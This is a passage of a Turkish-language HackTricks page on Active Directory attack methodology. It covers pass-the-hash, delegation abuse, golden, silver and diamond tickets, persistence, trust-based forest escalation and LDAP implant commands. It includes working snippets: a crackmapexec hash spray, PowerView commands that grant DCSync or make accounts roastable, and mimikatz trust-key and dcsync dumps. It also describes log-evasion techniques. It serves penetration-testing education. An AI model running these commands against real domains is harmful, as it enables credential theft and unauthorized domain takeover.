[**Hash'leri elde etmenin farklı yollarını öğrenmek için bu sayfayı okuyun.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Bir kullanıcının hash'ine sahip olduğunuzda**, onu **taklit etmek** için kullanabilirsiniz.\
Bu **hash'i kullanarak NTLM authentication gerçekleştirecek** bir **tool** kullanmanız gerekir; **veya** yeni bir **sessionlogon** oluşturup bu **hash'i** LSASS içine **inject** edebilirsiniz. Böylece herhangi bir **NTLM authentication gerçekleştirildiğinde**, **bu hash kullanılacaktır.** Son seçenek mimikatz'ın yaptığıdır.\
[**Daha fazla bilgi için bu sayfayı okuyun.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Bu saldırı, yaygın Pass The Hash over NTLM protocol'e alternatif olarak **kullanıcının NTLM hash'ini Kerberos ticket'ları istemek için kullanmayı** amaçlar. Bu nedenle, **NTLM protocol'ünün devre dışı bırakıldığı ve authentication protocol olarak yalnızca Kerberos'a izin verilen** ağlarda özellikle **yararlı** olabilir.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

**Pass The Ticket (PTT)** saldırı yönteminde saldırganlar, parola veya hash değerleri yerine **bir kullanıcının authentication ticket'ını çalar**. Daha sonra bu çalınan ticket, **kullanıcıyı taklit etmek** ve bir ağ içindeki kaynaklara ve hizmetlere yetkisiz erişim kazanmak için kullanılır.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Bir **local administrato**r hesabının **hash'ine** veya **parolasına** sahipseniz, bu hesapla diğer **PC'lere yerel olarak login olmayı** denemelisiniz.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Bunun oldukça **gürültülü** olduğunu ve **LAPS**'in bunu **mitigate** edeceğini unutmayın.

### MSSQL Abuse & Trusted Links

Bir kullanıcının **MSSQL instances**'larına **access** ayrıcalıkları varsa, bunları MSSQL host üzerinde **execute commands** için kullanabilir (SA olarak çalışıyorsa), NetNTLM **hash**'ini **steal** edebilir veya bir **relay** **attack** gerçekleştirebilir.\
Bir MSSQL instance başka bir instance tarafından bir database link üzerinden trusted ise, linked database üzerinde ayrıcalıkları olan bir kullanıcı **trust relationship'ı kullanarak diğer instance üzerinde queries execute** edebilir. Bu trust'lar zincirlenebilir ve sonunda kullanıcının commands execute edebileceği yanlış yapılandırılmış bir database'e ulaşabilir.\
**Databases arasındaki links, forest trusts genelinde bile çalışır.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Üçüncü taraf inventory ve deployment suite'leri genellikle credentials ve code execution için güçlü yollar sunar. Bkz.:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

[ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) attribute'una sahip herhangi bir Computer object bulur ve computer üzerinde domain privileges'a sahip olursanız, computer'a login olan her kullanıcının memory'sinden TGT'leri dump edebilirsiniz.\
Dolayısıyla bir **Domain Admin computer'a login olursa**, onun TGT'sini dump edebilir ve [Pass the Ticket](pass-the-ticket.md) kullanarak onu impersonate edebilirsiniz.\
Constrained delegation sayesinde bir **Print Server'ı otomatik olarak compromise** bile edebilirsiniz (umarız bu bir DC olur).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Bir user veya computer "Constrained Delegation" için allowed ise, **bir computer üzerindeki bazı services'lara access etmek için herhangi bir user'ı impersonate** edebilir.\
Ardından bu user/computer'ın **hash'ini compromise** ederseniz, **bazı services'lara access etmek için herhangi bir user'ı** (domain admins dahil) **impersonate** edebilirsiniz.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Uzak bir computer'ın Active Directory object'i üzerinde **WRITE** privilege'ına sahip olmak, **elevated privileges** ile code execution elde edilmesini sağlar:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Compromise edilmiş user'ın bazı domain objects üzerinde **lateral hareket** etmesine/**privileges escalate** etmesine olanak sağlayabilecek **ilginç privileges**'ları olabilir.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Domain içinde **Spool service listening** tespit edilmesi, **yeni credentials elde etmek** ve **privileges escalate** etmek için **abuse** edilebilir.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

**Diğer users** **compromise** edilmiş machine'a **access** ederse, **memory'den credentials toplamak** ve hatta onları impersonate etmek için **process'lerine beacon inject etmek** mümkündür.\
Users genellikle sisteme RDP üzerinden access eder; bu nedenle aşağıda third-party RDP sessions üzerinde birkaç attack'ın nasıl gerçekleştirileceğini bulabilirsiniz:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS**, domain'e join edilmiş computer'larda **local Administrator password**'ünü yönetmek için bir sistem sağlar; password'ün **randomized**, unique ve sık sık **changed** olmasını garanti eder. Bu password'ler Active Directory'de saklanır ve access, yalnızca yetkili users için ACL'ler üzerinden kontrol edilir. Bu password'lere access etmek için yeterli permissions'a sahip olduğunuzda, diğer computer'lara pivot etmek mümkün hale gelir.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Compromise edilmiş machine'dan **certificates toplamak**, environment içinde privileges escalate etmenin bir yolu olabilir:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

**Vulnerable templates** yapılandırılmışsa, privileges escalate etmek için bunları abuse etmek mümkündür:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

**Domain Admin** veya daha iyisi **Enterprise Admin** privileges elde ettiğinizde, **domain database**'ini: _ntds.dit_ **dump** edebilirsiniz.

[**DCSync attack hakkında daha fazla bilgiye buradan ulaşabilirsiniz**](dcsync.md).

[**NTDS.dit'in nasıl steal edileceği hakkında daha fazla bilgiye buradan ulaşabilirsiniz**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Daha önce ele alınan bazı teknikler persistence için kullanılabilir.\
Örneğin:

- Users'ı [**Kerberoast**](kerberoast.md) için vulnerable hale getirin

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Users'ı [**ASREPRoast**](asreproast.md) için vulnerable hale getirin

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Bir user'a [**DCSync**](#dcsync) privileges grant edin

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack**, belirli bir service için **NTLM hash**'ini (örneğin **PC account'ın hash**'ini) kullanarak **legitimate Ticket Granting Service (TGS) ticket** oluşturur. Bu yöntem, **service privileges'a access etmek** için kullanılır.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Bir **Golden Ticket attack**, Active Directory (AD) environment'ında saldırganın **krbtgt account'ın NTLM hash**'ine access elde etmesini içerir. Bu account özeldir; çünkü AD network içinde authentication için gerekli olan tüm **Ticket Granting Tickets (TGTs)**'leri sign etmek için kullanılır.

Saldırgan bu hash'i elde ettiğinde, seçtiği herhangi bir account için **TGTs** oluşturabilir (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Bunlar, **yaygın golden tickets detection mekanizmalarını bypass edecek şekilde forge edilmiş golden tickets** gibidir.


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Bir account'ın certificates'larına sahip olmak veya bunları request edebilmek**, user password'ünü değiştirse bile user account'ında persistence sağlayabilmenin çok iyi bir yoludur:


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Certificates kullanarak domain içinde yüksek privileges ile persistence sağlamak da mümkündür:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory'deki **AdminSDHolder** object'i, unauthorized changes'ı önlemek için bu gruplara standart bir **Access Control List (ACL)** uygulayarak **privileged groups**'ların (Domain Admins ve Enterprise Admins gibi) security'sini garanti eder. Ancak bu özellik abuse edilebilir; bir attacker AdminSDHolder'ın ACL'sini modify ederek normal bir user'a full access verirse, bu user tüm privileged groups üzerinde kapsamlı control elde eder. Koruma amacı taşıyan bu security önlemi, yakından monitor edilmediğinde ters tepebilir ve yetkisiz access'e olanak sağlayabilir.

[**AdminDSHolder Group hakkında daha fazla bilgiye buradan ulaşabilirsiniz.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Her **Domain Controller (DC)** içinde bir **local administrator** account'ı bulunur. Böyle bir machine üzerinde admin rights elde ederek local Administrator hash'i **mimikatz** kullanarak extract edilebilir. Bunun ardından, **bu password'ün kullanımını enable etmek** ve local Administrator account'ına remote access sağlamak için bir registry modification gerekir.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Belirli domain objects üzerinde bir **user'a** bazı **special permissions** **verebilirsiniz**; bu permissions user'ın gelecekte **privileges escalate etmesini** sağlar.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors**, bir **object'in** başka bir **object üzerinde sahip olduğu** **permissions**'ları **saklamak** için kullanılır. Bir object'in **security descriptor**'ında küçük bir değişiklik **yapabilirseniz**, privileged bir group'ın üyesi olmanız gerekmeden o object üzerinde oldukça ilginç privileges elde edebilirsiniz.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Kısa ömürlü principals/GPOs/DNS records oluşturmak için `dynamicObject` auxiliary class'ını `entryTTL`/`msDS-Entry-Time-To-Die` ile abuse edin; bunlar tombstone bırakmadan kendilerini siler, LDAP evidence'ını yok ederken orphan SIDs, broken `gPLink` references veya cached DNS responses (ör. AdminSDHolder ACE pollution ya da malicious `gPCFileSysPath`/AD-integrated DNS redirects) bırakır.

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Tüm domain accounts'larına access sağlayan **universal password** oluşturmak için memory'deki **LSASS**'ı alter edin.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[SSP'nin (Security Support Provider) ne olduğunu buradan öğrenin.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Machine'a access etmek için kullanılan **credentials**'ları **clear text** olarak **capture** etmek üzere **own SSP**'nizi oluşturabilirsiniz.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

AD içinde **new Domain Controller** register eder ve bunu belirtilen objects üzerine **attributes** (SIDHistory, SPNs...) **push etmek** için kullanır; **modifications** hakkında herhangi bir **logs** bırakmaz. **DA** privileges'a sahip olmanız ve **root domain** içinde bulunmanız gerekir.\
Yanlış data kullanırsanız oldukça kötü logs oluşacağını unutmayın.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Daha önce **LAPS passwords'larını okumak için yeterli permission'a** sahip olduğunuzda privileges'ı nasıl escalate edebileceğinizi ele almıştık. Ancak bu password'ler **persistence'ı sürdürmek** için de kullanılabilir.\
Bkz.:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft, **Forest**'ı security boundary olarak görür. Bu, **tek bir domain'in compromise edilmesinin potansiyel olarak tüm Forest'ın compromise edilmesine** yol açabileceği anlamına gelir.<sup>[[1]](#references)</sup>

### Basic Information

Bir [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>), bir **domain**'deki user'ın başka bir **domain**'deki resources'lara access etmesini sağlayan bir security mekanizmasıdır. Esasen iki domain'in authentication systems'ları arasında bir bağlantı oluşturur ve authentication verifications'larının sorunsuz şekilde akmasını sağlar. Domain'ler bir trust kurduğunda, trust'ın integrity'si için kritik olan belirli **keys**'leri **Domain Controllers (DCs)** içinde exchange eder ve saklar.

Tipik bir senaryoda, bir user **trusted domain** içindeki bir service'a access etmek isterse, öncelikle kendi domain'inin DC'sinden **inter-realm TGT** olarak bilinen özel bir ticket request etmelidir. Bu TGT, her iki domain'in üzerinde anlaştığı ortak bir **key** ile encrypt edilir. Ardından user, bir service ticket (**TGS**) almak için bu TGT'yi **trusted domain'in DC'sine** sunar. Trusted domain'in DC'si inter-realm TGT'yi başarıyla validate ettiğinde, user'a service'a access sağlayan bir TGS issue eder.

**Steps**:

1. **Domain 1** içindeki bir **client computer**, **NTLM hash**'ini kullanarak **Domain Controller'ından (DC1)** bir **Ticket Granting Ticket (TGT)** request ederek süreci başlatır.
2. Client başarıyla authenticated olursa DC1 yeni bir TGT issue eder.
3. Client daha sonra **Domain 2** içindeki resources'lara access etmek için gereken bir **inter-realm TGT**'yi DC1'den request eder.
4. Inter-realm TGT, two-way domain trust'ın parçası olarak DC1 ve DC2 arasında paylaşılan bir **trust key** ile encrypt edilir.
5. Client, inter-realm TGT'yi **Domain 2'nin Domain Controller'ına (DC2)** götürür.
6. DC2, paylaşılan trust key'i kullanarak inter-realm TGT'yi verify eder ve geçerliyse client'ın Domain 2'de access etmek istediği server için bir **Ticket Granting Service (TGS)** issue eder.
7. Son olarak client, Domain 2'deki service'a access etmek için bu TGS'yi server'a sunar; TGS, server'ın account hash'i ile encrypt edilmiştir.

### Different trusts

**Bir trust'ın 1 yönlü veya 2 yönlü olabileceğine** dikkat etmek önemlidir. 2 yönlü seçeneklerde her iki domain birbirine trust eder; ancak **1 yönlü** trust relation'da domain'lerden biri **trusted**, diğeri ise **trusting** domain olur. Son durumda, **trusted domain'den trusting domain içindeki resources'lara access edebilirsiniz**.

Domain A, Domain B'ye trust ediyorsa A trusting domain, B ise trusted domain'dir. Ayrıca **Domain A** açısından bu bir **Outbound trust**; **Domain B** açısından ise bir **Inbound trust** olur.

**Different trusting relationships**

- **Parent-Child Trusts**: Bu, aynı forest içindeki yaygın bir yapıdır; child domain otomatik olarak parent domain ile two-way transitive trust'a sahip olur. Esasen bu, authentication requests'lerinin parent ve child arasında sorunsuz şekilde akabileceği anlamına gelir.
- **Cross-link Trusts**: "shortcut trusts" olarak adlandırılır ve referral process'lerini hızlandırmak için child domain'ler arasında kurulur. Complex forests'ta authentication referrals'larının genellikle forest root'a kadar çıkıp ardından target domain'e inmesi gerekir. Cross-links oluşturularak bu yol kısaltılır; bu da özellikle coğrafi olarak dağınık environments'larda faydalıdır.
- **External Trusts**: Farklı ve ilişkisiz domain'ler arasında kurulur ve doğaları gereği non-transitive'dir. [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)'a göre external trusts, forest trust ile bağlı olmayan current forest dışındaki bir domain'deki resources'lara access etmek için kullanışlıdır. Security, external trusts ile SID filtering sayesinde güçlendirilir.
- **Tree-root Trusts**: Forest root domain ile yeni eklenen bir tree root arasında otomatik olarak kurulur. Sık karşılaşılmasa da tree-root trusts, bir forest'a yeni domain trees eklemek için önemlidir; bunların unique bir domain name korumasını ve two-way transitivity sağlamasını mümkün kılar. Daha fazla bilgi [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) içinde bulunabilir.
- **Forest Trusts**: Bu trust türü, iki forest root domain arasında two-way transitive trust'tır ve security measures'ı güçlendirmek için SID filtering'i de uygular.
- **MIT Trusts**: Windows dışı, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domain'leriyle kurulur. MIT trusts biraz daha specialized'dır ve Windows ecosystem'ı dışındaki Kerberos-based systems'larla integration gerektiren environments'lara yöneliktir.

#### Other differences in **trusting relationships**

- Bir trust relationship **transitive** (A B'ye trust eder, B C'ye trust eder, ardından A C'ye trust eder) veya **non-transitive** olabilir.
- Bir trust relationship **bidirectional trust** (her ikisi de birbirine trust eder) veya **one-way trust** (yalnızca biri diğerine trust eder) olarak kurulabilir.

### Attack Path

1. Trusting relationships'ları **enumerate** edin
2. Herhangi bir **security principal**'ın (user/group/computer) diğer **domain**'in resources'larına **access**'i olup olmadığını kontrol edin; bu access ACE entries yoluyla veya diğer domain'in groups'larında yer alma yoluyla olabilir. **Domains arasındaki relationships**'ları arayın (trust muhtemelen bunun için oluşturulmuştur).
1. Bu durumda kerberoast başka bir option olabilir.
3. Domain'ler arasında **pivot** edebilen **accounts**'ları **compromise** edin.

Saldırganların başka bir domain'deki resources'lara access etmek için kullanabileceği üç temel mechanism vardır:

- **Local Group Membership**: Principals, bir server üzerindeki “Administrators” group'ı gibi machine'lardaki local groups'lara eklenebilir ve bu sayede machine üzerinde önemli bir control elde edebilir.
- **Foreign Domain Group Membership**: Principals, foreign domain içindeki groups'ların da üyesi olabilir. Ancak bu yöntemin effectiveness'ı trust'ın nature'ına ve group'ın scope'una bağlıdır.
- **Access Control Lists (ACLs)**: Principals, bir **ACL** içinde, özellikle bir **DACL** içindeki **ACEs** üzerinde entities olarak belirtilebilir ve bu onlara belirli resources'lara access sağlayabilir. ACLs, DACLs ve ACEs'in mechanics'ini daha ayrıntılı incelemek isteyenler için “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” başlıklı whitepaper değerli bir kaynaktır.<sup>[[17]](#references)</sup>

### Find external users/groups with permissions

Domain'deki foreign security principals'ları bulmak için **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** konumunu kontrol edebilirsiniz. Bunlar **external domain/forest**'tan user/group'lardır.

Bunu **Bloodhound** ile veya powerview kullanarak kontrol edebilirsiniz:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Etki alanı güven ilişkilerini listelemenin diğer yolları:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> **2 trusted keys** vardır; bunlardan biri _Child --> Parent_, diğeri ise _Parent_ --> _Child_ içindir.\
> Mevcut domain tarafından kullanılan anahtarı şu komutlarla alabilirsiniz:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

SID-History injection kullanarak trust'ı kötüye kullanıp child/parent domain'de Enterprise admin olarak escalate olun:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Configuration Naming Context'in (NC) nasıl exploit edilebileceğini anlamak çok önemlidir. Configuration NC, Active Directory (AD) ortamlarında bir forest genelindeki configuration verileri için merkezi bir repository görevi görür. Bu veriler forest içindeki her Domain Controller'a (DC) replicate edilir ve writable DC'ler Configuration NC'nin yazılabilir bir kopyasını tutar. Bunu exploit etmek için bir DC üzerinde, tercihen bir child DC'de **SYSTEM privileges** sahibi olunmalıdır.

**Link GPO to root DC site**

Configuration NC'nin Sites container'ı, AD forest içindeki domain-joined tüm bilgisayarların siteleri hakkında bilgiler içerir. Herhangi bir DC üzerinde SYSTEM privileges ile çalışarak saldırganlar GPO'ları root DC sitelerine linkleyebilir. Bu işlem, bu sitelere uygulanan policy'leri manipüle ederek root domain'i potansiyel olarak compromise eder.

Ayrıntılı bilgi için [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4) araştırması incelenebilir.<sup>[[12]](#references)</sup>

**Compromise any gMSA in the forest**

Bir attack vector, domain içindeki privileged gMSA'leri hedeflemeyi içerir. gMSA'lerin password'lerini hesaplamak için gerekli olan KDS Root key, Configuration NC içinde saklanır. Herhangi bir DC üzerinde SYSTEM privileges ile KDS Root key'e erişmek ve forest genelindeki herhangi bir gMSA için password'leri hesaplamak mümkündür.

Ayrıntılı analiz ve adım adım rehber şu kaynakta bulunabilir:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Tamamlayıcı delegated MSA attack (BadSuccessor – migration attributes'ı kötüye kullanma):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Ek external research: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema change attack**

Bu method sabır gerektirir; yeni privileged AD object'lerinin oluşturulmasını beklemek gerekir. SYSTEM privileges ile saldırgan, herhangi bir user'a tüm class'lar üzerinde tam control vermek için AD Schema'yı değiştirebilir. Bu durum, yeni oluşturulan AD object'lerine yetkisiz erişim ve control elde edilmesine yol açabilir.

Daha fazla bilgiye [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6) üzerinden ulaşılabilir.<sup>[[14]](#references)</sup>

**From DA to EA with ADCS ESC5**

ADCS ESC5 vulnerability, forest içindeki herhangi bir user olarak authentication sağlayan bir certificate template oluşturmak için Public Key Infrastructure (PKI) object'leri üzerindeki control'ü hedefler. PKI object'leri Configuration NC içinde bulunduğundan, writable bir child DC'nin compromise edilmesi ESC5 attack'lerinin gerçekleştirilmesini sağlar.

Daha fazla ayrıntı [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/) kaynağında bulunabilir.<sup>[[15]](#references)</sup> ADCS bulunmayan senaryolarda saldırgan, [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) kaynağında açıklandığı üzere gerekli component'leri kurabilir.<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Bu senaryoda **domain'iniz**, size bu domain üzerinde **belirsiz izinler** veren harici bir domain tarafından **trusted** durumdadır. Domain'inizdeki **hangi principal'ların harici domain üzerinde hangi erişimlere sahip olduğunu** bulmanız ve ardından bunları exploit etmeye çalışmanız gerekir:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Harici Forest Domain - Tek Yönlü (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Bu senaryoda **sizin domain'iniz**, **farklı domain'lerden** bir principal'a bazı **privileges** **trust** etmektedir.

Ancak bir **domain**, trusting domain tarafından **trusted** edildiğinde, trusted domain **tahmin edilebilir bir ad** kullanan ve **password olarak trusted password** belirlenen bir user **oluşturur**. Bu da **trusting domain'deki bir user'a erişerek trusted domain'in içine girmeyi**, onu enumerate etmeyi ve daha fazla privilege elde etmeye çalışmayı mümkün kılar:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Trusted domain'i compromise etmenin başka bir yolu, domain trust'ın **ters yönünde** oluşturulmuş bir [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) bulmaktır (bu çok yaygın değildir).

Trusted domain'i compromise etmenin başka bir yolu da **trusted domain'den bir user'ın erişebildiği** bir makinede bekleyerek **RDP** üzerinden login olmasını sağlamaktır. Ardından attacker, RDP session process'ine code inject edebilir ve buradan **victim'ın origin domain'ine erişebilir**.\
Ayrıca, **victim hard drive'ını mount ettiyse**, attacker **RDP session** process'i üzerinden **hard drive'ın startup folder'ına backdoor'lar** yerleştirebilir. Bu technique **RDPInception** olarak adlandırılır.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Forest trust'leri üzerinden SID history attribute'undan yararlanan attack'lerin riski, tüm inter-forest trust'lerde default olarak etkinleştirilen SID Filtering ile azaltılır. Bu yaklaşım, Microsoft'un görüşüne göre security boundary olarak domain yerine forest'ın kabul edilmesi nedeniyle intra-forest trust'lerin güvenli olduğu varsayımına dayanır.
- Ancak bir sorun vardır: SID filtering, application'ları ve user access'i bozabilir ve bu nedenle zaman zaman devre dışı bırakılabilir.

### **Selective Authentication:**

- Inter-forest trust'ler için Selective Authentication kullanılması, iki forest'taki user'ların otomatik olarak authenticate edilmemesini sağlar. Bunun yerine, user'ların trusting domain veya forest içindeki domain'lere ve server'lara erişebilmesi için açık permissions gerekir.
- Bu önlemlerin writable Configuration Naming Context (NC)'nin exploitation'ına veya trust account'a yönelik attack'lere karşı koruma sağlamadığını belirtmek önemlidir.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## On-Host Implant'lerden LDAP-based AD Abuse

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection), bloodyAD-style LDAP primitive'lerini tamamen on-host implant'in (ör. Adaptix C2) içinde çalışan x64 Beacon Object Files olarak yeniden uygular. Operator'ler pack'i `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` komutuyla compile eder, `ldap.axs` dosyasını load eder ve ardından beacon'dan `ldap <subcommand>` çağırır. Tüm traffic, LDAP (389) üzerinden mevcut logon security context'i kullanarak signing/sealing ile veya auto certificate trust özelliğine sahip LDAPS (636) üzerinden ilerler; bu nedenle socks proxy'leri veya disk artifact'leri gerekmez.<sup>[[4]](#references)</sup>

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` ve `get-groupmembers`, short name'leri/OU path'lerini full DN'lere resolve eder ve karşılık gelen object'leri dump eder.
- `get-object`, `get-attribute` ve `get-domaininfo`, security descriptor'lar dahil olmak üzere arbitrary attribute'ları ve forest/domain metadata'sını `rootDSE` üzerinden çeker.
- `get-uac`, `get-spn`, `get-delegation` ve `get-rbcd`, roasting candidate'lerini, delegation setting'lerini ve mevcut [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptor'larını doğrudan LDAP üzerinden gösterir.
- `get-acl` ve `get-writable --detailed`, trustee'leri, rights'ları (GenericAll/WriteDACL/WriteOwner/attribute writes) ve inheritance'ı listelemek için DACL'yi parse eder; böylece ACL privilege escalation için immediate target'lar sağlar.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Escalation & persistence için LDAP write primitives

- Object creation BOF'ları (`add-user`, `add-computer`, `add-group`, `add-ou`), operatörün OU haklarının bulunduğu her yerde yeni principal'ları veya machine account'ları hazırlamasını sağlar. `add-groupmember`, `set-password`, `add-attribute` ve `set-attribute`, write-property hakları bulunduğunda hedefleri doğrudan ele geçirir.
- `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` ve `add-dcsync` gibi ACL odaklı komutlar, herhangi bir AD object'i üzerindeki WriteDACL/WriteOwner haklarını; PowerShell/ADSI artifact'leri bırakmadan password reset, group membership control veya DCSync replication privilege'larına dönüştürür. `remove-*` karşılıkları, eklenen ACE'leri temizler.

### Delegation, roasting ve Kerberos abuse

- `add-spn`/`set-spn`, ele geçirilmiş bir user'ı anında Kerberoastable hâle getirir; `add-asreproastable` (UAC toggle), password'a dokunmadan user'ı AS-REP roasting için işaretler.
- Delegation macro'ları (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`), beacon üzerinden `msDS-AllowedToDelegateTo`, UAC flag'lerini veya `msDS-AllowedToActOnBehalfOfOtherIdentity` değerini yeniden yazarak constrained/unconstrained/RBCD attack path'lerini etkinleştirir ve remote PowerShell veya RSAT gereksinimini ortadan kaldırır.

### sidHistory injection, OU relocation ve attack surface shaping

- `add-sidhistory`, kontrol edilen bir principal'ın SID history'sine privileged SID'leri inject eder (bkz. [SID-History Injection](sid-history-injection.md)); tamamen LDAP/LDAPS üzerinden stealthy access inheritance sağlar.
- `move-object`, computer veya user'ların DN/OU değerini değiştirir ve saldırganın asset'leri, `set-password`, `add-groupmember` veya `add-spn` abuse edilmeden önce delegated rights'ların zaten bulunduğu OU'lara taşımasına olanak tanır.
- Sıkı şekilde kapsamlandırılmış removal komutları (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` vb.), operatör credential'ları veya persistence'ı harvest ettikten sonra hızlı rollback yapılmasını sağlayarak telemetry'yi en aza indirir.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
